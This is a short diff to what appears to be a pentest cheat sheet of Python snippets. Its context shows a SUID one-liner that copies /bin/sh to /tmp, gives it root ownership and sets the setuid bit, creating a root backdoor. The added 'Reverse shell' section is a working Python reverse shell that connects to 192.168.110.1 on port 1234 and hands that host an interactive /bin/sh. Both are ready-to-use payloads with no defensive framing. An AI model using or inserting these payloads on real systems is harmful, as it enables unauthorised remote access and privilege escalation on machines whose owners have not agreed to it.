@@ -137,11 +137,24 @@ for w in raw_words.split():
     w = w.strip()
 
 ```
-
-
+## SUID
 
 ```python
 # set suid
 import os; os.system('cp /bin/sh /tmp/sh');   os.system('chown root.root /tmp/sh'); os.system('chmod 4755 /tmp/sh');
 
 ```
+
+## Reverse shell
+
+```python
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.110.1",1234))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+```
+ 
